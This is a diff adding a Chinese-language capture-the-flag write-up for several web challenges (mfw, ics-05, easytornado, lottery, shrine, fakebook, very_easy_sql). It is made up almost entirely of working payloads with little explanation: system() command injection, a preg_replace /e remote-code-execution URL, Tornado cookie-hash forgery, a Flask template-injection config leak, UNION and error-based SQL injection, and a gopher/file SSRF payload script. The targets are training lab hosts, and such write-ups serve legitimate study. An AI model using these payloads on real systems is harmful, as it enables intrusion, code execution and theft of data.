@@ -631,3 +631,311 @@ print(ans)
 ```
 
 flag: `Cyberpeace{786OsErtk12}`
+
+## 难度 3
+
+### mfw
+
+git 泄露
+
+```shell
+$ perl rip-git.pl -v -u "http://61.147.171.105:65368/.git"
+```
+
+payload:
+
+```
+' . system('cat templates/flag.php') . '
+```
+
+flag: `cyberpeace{9eb644f79cad1d7688aa4b3a32cc433a}`
+
+### ics-05
+
+读取源代码
+
+```
+http://61.147.171.105:54271/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
+
+
+```php
+
+<?php
+error_reporting(0);
+
+@session_start();
+posix_setuid(1000);
+
+
+?>
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="layui/css/layui.css" media="all">
+    <title>设备维护中心</title>
+    <meta charset="utf-8">
+</head>
+
+<body>
+    <ul class="layui-nav">
+        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
+    </ul>
+    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+        <legend>设备列表</legend>
+    </fieldset>
+    <table class="layui-hide" id="test"></table>
+    <script type="text/html" id="switchTpl">
+        <!-- 这里的 checked 的状态只是演示 -->
+        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
+    </script>
+    <script src="layui/layui.js" charset="utf-8"></script>
+    <script>
+    layui.use('table', function() {
+        var table = layui.table,
+            form = layui.form;
+
+        table.render({
+            elem: '#test',
+            url: '/somrthing.json',
+            cellMinWidth: 80,
+            cols: [
+                [
+                    { type: 'numbers' },
+                     { type: 'checkbox' },
+                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
+                     { field: 'name', title: '设备名', templet: '#nameTpl' },
+                     { field: 'area', title: '区域' },
+                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
+                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
+                ]
+            ],
+            page: true
+        });
+    });
+    </script>
+    <script>
+    layui.use('element', function() {
+        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
+        //监听导航点击
+        element.on('nav(demo)', function(elem) {
+            //console.log(elem)
+            layer.msg(elem.text());
+        });
+    });
+    </script>
+
+<?php
+
+$page = $_GET[page];
+
+if (isset($page)) {
+
+
+
+if (ctype_alnum($page)) {
+?>
+
+    <br /><br /><br /><br />
+    <div style="text-align:center">
+        <p class="lead"><?php echo $page; die();?></p>
+    <br /><br /><br /><br />
+
+<?php
+
+}else{
+
+?>
+        <br /><br /><br /><br />
+        <div style="text-align:center">
+            <p class="lead">
+                <?php
+
+                if (strpos($page, 'input') > 0) {
+                    die();
+                }
+
+                if (strpos($page, 'ta:text') > 0) {
+                    die();
+                }
+
+                if (strpos($page, 'text') > 0) {
+                    die();
+                }
+
+                if ($page === 'index.php') {
+                    die('Ok');
+                }
+                    include($page);
+                    die();
+                ?>
+        </p>
+        <br /><br /><br /><br />
+
+<?php
+}}
+
+//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
+
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
+
+    echo "<br >Welcome My Admin ! <br >";
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) && isset($replacement) && isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);
+    }else{
+        die();
+    }
+
+}
+?>
+
+</body>
+
+</html>
+```
+
+
+```
+http://61.147.171.105:54271/index.php?pat=/.*/e&rep=system('cat s3chahahaDir/flag/flag.php')&sub=sub
+```
+
+flag: `cyberpeace{201c83d4bc8da162976bdcadd41ae76e}`
+
+### easytornado
+
+```python
+import hashlib
+
+def main() -> None:
+    cookie_secret = '58366507-05ca-410a-be93-aa3f1c0072cb'
+    
+    filename = '/fllllllllllllag'.encode()
+    
+    checksum = hashlib.md5((cookie_secret + hashlib.md5(filename).hexdigest()).encode()).hexdigest()
+    
+    print(checksum)
+
+if __name__ == '__main__':
+    main()
+```
+
+```
+http://61.147.171.105:59887/file?filename=/fllllllllllllag&filehash=5efc74a23b81eb04d720aa2022fb50f5
+```
+
+flag: `flag{3f39aea39db345769397ae895edb9c70}`
+
+### lottery
+
+审计源码，弱类型比较
+
+```shell
+$ curl 'http://61.147.171.105:54954/api.php' \
+  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7' \
+  -H 'Cache-Control: no-cache' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/json' \
+  -H 'Cookie: PHPSESSID=79c47e4e926f9895872388eb1987a965' \
+  -H 'DNT: 1' \
+  -H 'Origin: http://61.147.171.105:54954' \
+  -H 'Pragma: no-cache' \
+  -H 'Referer: http://61.147.171.105:54954/buy.php' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  --data-raw '{"action":"buy","numbers":[true,true,true,true,true,true,true]}' \
+  --insecure
+
+```
+
+flag: `cyberpeace{dabba34593212fa3e3020a67cb057a83}`
+
+### shrine
+
+```
+http://61.147.171.105:53349/shrine/{{ get_flashed_messages.__globals__['current_app'].config['FLAG'] }}
+```
+
+flag: `flag{shrine_is_good_ssti}`
+
+### fakebook
+
+```
+http://61.147.171.105:53175/view.php?no=-1/**/union/**/select/**/1,group_concat(distinct/**/schema_name),3,4/**/from/**/information_schema.schemata
+```
+
+```
+fakebook,information_schema,mysql,performance_schema,test
+```
+
+```
+http://61.147.171.105:53175/view.php?no=-1/**/union/**/select/**/1,group_concat(distinct/**/table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema='fakebook'
+```
+
+```
+users
+```
+
+```
+http://61.147.171.105:53175/view.php?no=-1/**/union/**/select/**/1,group_concat(distinct/**/column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_schema='fakebook'/**/and/**/table_name='users'
+```
+
+```
+no,username,passwd,data
+```
+
+那么应该就是反序列化了
+
+```
+http://61.147.171.105:53175/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"111";s:3:"age";i:111;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'/**/from/**/users/**/where/**/no=1
+```
+
+flag: `flag{c1e552fdf77049fabf65168f22f7aeab}`
+
+### very_easy_sql
+
+```python
+from urllib import parse
+from base64 import b64encode
+
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select database()), 0x7e), 1), ('3"
+# ==> security
+
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(schema_name), 1, 16) from information_schema.schemata), 0x7e), 1), ('3"
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(schema_name), 17, 32) from information_schema.schemata), 0x7e), 1), ('3"
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(schema_name), 33, 48) from information_schema.schemata), 0x7e), 1), ('3"
+# ==> information_schema,mysql,performance_schema,security
+
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(distinct table_name), 1, 16) from information_schema.tables where table_schema='security'), 0x7e), 1), ('3"
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(distinct table_name), 17, 32) from information_schema.tables where table_schema='security'), 0x7e), 1), ('3"
+# ==> emails,flag,referers,uagents,users
+
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(distinct column_name), 1, 16) from information_schema.columns where table_schema='security' and table_name='flag'), 0x7e), 1), ('3"
+# ==> flag
+
+# inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(flag), 1, 16) from flag), 0x7e), 1), ('3"
+inject = "admin') union select 1, updatexml(1, concat(0x7e, (select substr(group_concat(flag), 17, 32) from flag), 0x7e), 1), ('3"
+# ==> cyberpeace{182ec8d8e7d92fb41c731aba863ce746}
+
+payload = """GET /index.php HTTP/1.1
+HOST: 127.0.0.1:80
+Accept: */*
+Cookie: this_is_your_cookie={}
+Content-Length: 0
+""".format(b64encode(inject.encode()).decode())
+
+payload = payload.replace('\n', '\r\n')
+payload = parse.quote(payload)
+print(f"gopher://127.0.0.1:80/_{payload}")
+```
+
+flag: `cyberpeace{182ec8d8e7d92fb41c731aba863ce746}`
